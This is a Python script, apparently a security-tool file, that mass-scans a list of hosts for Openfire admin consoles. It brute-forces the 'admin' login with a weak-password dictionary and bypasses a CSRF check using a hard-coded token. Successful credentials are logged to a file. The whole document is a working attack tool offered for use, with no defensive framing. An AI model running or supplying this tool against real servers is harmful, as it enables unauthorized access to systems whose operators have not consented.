#!/usr/bin/env python
# -*- coding:UTF-8 -*-
# 2020/11/20 周五 11:30:15.95
# By  Hasaki-h1

import requests
import sys
from progress.bar import Bar

try:
    try:
        ip_file = sys.argv[1]
        weakpass_file = sys.argv[2]
    except Exception as e:
        print("\npython Scan_Openfire_weakpass.py ip_port.txt weak_pass.txt\n\nIP资产TXT格式: 192.168.1.1:8080 ")
        sys.exit()

    headers = {
        "Content-Length": "58",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http//www.baidu.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "JSESSIONID=",
        "Connection": "close"
    }
    headers1 = {
        "Content-Length": "58",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http//www.baidu.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "JSESSIONID=;csrf=O19BfQauke4xbq4",
        "Connection": "close"
    }
    data = {"url": "%2Findex.jsp", "login": "true", "username": "admin", "password": "123456"}
    data1 = {"url": "%2Findex.jsp", "csrf": "O19BfQauke4xbq4", "login": "true", "username": "admin", "password": "123456"}
    #proxies = {'http': '127.0.0.1:8080'}
    #data['password'] = 11111111111111111
    # print(data)
    with open(ip_file, "r") as f:
        s = f.readlines()
        print("☆--------------------读取完毕-----资产总数-%s--------------------☆" % len(s))
        # 可以扫描列表
        ok_scan = []
        # 进度计算
        i = 1 
        all_s = len(s)
        for u in s:
            process = "当前进度--> {:.2%}".format(i / all_s)
            try:
                url = "http://" + u.strip('\n') + "/login.jsp"
                # 测试连接是否正常
                response = requests.get(url, verify=False, allow_redirects=True, timeout=2)
                if response.status_code == 200:
                    print(response.status_code, "%s -连接成功-->" % process, url)
                else:
                    print("001%s  -网页无效--> %s -------Error!!!" % (process, url))
                # 测试登录是否异常
                response_post_test = requests.post(url, verify=False, allow_redirects=True, data=data, headers=headers, timeout=2)
                status_code_list = [200, 301, 302]
                if (response_post_test.status_code not in status_code_list):
                    print("004------登录异常--> %s -------Error!!!" % response_post_test.status_code)
                    continue
                else:
                    # print(response_post_test.status_code)
                    pass
                ok_scan.append(url)
            except Exception as e:
                if "Connection aborted" in str(e):
                    print("001%s  -网页无效--> %s -------Error!!!" % (process, url))
                elif "NewConnectionError" in str(e):
                    print("002%s  -拒绝请求--> %s -------Error!!!" % (process, url))
                elif "ConnectTimeoutError" in str(e):
                    print("003%s  -连接超时--> %s -------Error!!!" % (process, url))
                else:
                    print(e)
                pass
            i = i + 1
        print("☆--------------------验证完毕-----爆破总数-%s--------------------☆" % len(ok_scan))
    with open(weakpass_file, 'r') as f1:
        weakpass = f1.readlines()
    with open("success.txt", 'w') as f2:
        j = 0 
        all_o = len(ok_scan)
        for b in ok_scan:
            process1 = "当前进度--> {:.2%}".format(j / all_o)
            z = 0
            all_p = len(weakpass)
            print("\n☆开始爆破-----%s %s--------------------☆\n" % (process1, b))
            # 测试是否含有CSRF认证
            try:
                response_test = requests.post(b, verify=False, allow_redirects=True, data=data, headers=headers, timeout=3)
            except Exception as e:
                print(e)
                continue
            # 有CSRF需要替换data以及headers
            if "CSRF Failure" in response_test.text:
                data = data1
                headers = headers1
            else:
                pass
            bar = Bar(max=100, fill="█", suffix="%(percent)d%%", encoding="UTF-8")
            for wp in weakpass:
                process2 = "---progress--> {:.2%} ".format(z / all_p)
                try:
                    data['password'] = wp
                    response = requests.post(b, verify=False, allow_redirects=True, data=data, headers=headers, timeout=3)
                    # print(response.text)
                    if ("Login failed" in response.text) or ("登录失败" in response.text) or ("BEGIN error box" in response.text):
                        #print("%s %s 爆破失败---admin--%s" % (response.status_code, process2, wp))
                        bar.next()
                        pass
                    # or ("Behaviour.register(myrules)" in response.text))
                    elif(len(response.text) > 500):
                        print("%s 爆破成功---admin--%s-----Successful!" % (process2, wp.strip('\n')))
                        #print(response.status_code, response.headers['location'])
                        f2.write("%s 爆破成功---admin--%s-----Successful!" % (b, wp.strip('\n')))
                        bar.next(100)
                        break
                    else:
                        print(response.status_code)
                except Exception as e:
                    if "Connection aborted" in str(e):
                        print("001%s  -网页无效--> %s -------Error!!!" % (process2, url))
                        break
                    elif "NewConnectionError" in str(e):
                        print("002%s  -拒绝请求--> %s -------Error!!!" % (process2, url))
                        break
                    elif "HTTPConnectionPool" in str(e):
                        print("003%s  -连接超时--> %s -------Error!!!" % (process2, url))
                        break
                    else:
                        print(e)
                    pass
                z = z + 1
            j = j + 1
            bar.finish()
except KeyboardInterrupt:
    print("已取消")
    sys.exit()
